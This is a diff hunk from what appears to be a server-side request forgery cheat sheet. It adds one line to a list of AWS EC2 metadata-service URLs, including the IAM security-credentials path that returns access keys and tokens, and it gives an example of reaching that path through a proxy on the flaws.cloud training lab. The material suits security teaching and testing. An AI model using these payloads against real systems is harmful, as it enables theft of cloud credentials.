@@ -111,6 +111,7 @@ Amazon exposes an internal service every EC2 instance can query for instance met
 http://169.254.169.254/latest/meta-data/
 http://169.254.169.254/latest/user-data/
 http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_HERE will return the AccessKeyID, SecretAccessKey, and Token
+http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
 ```
 
 For example with a proxy : http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
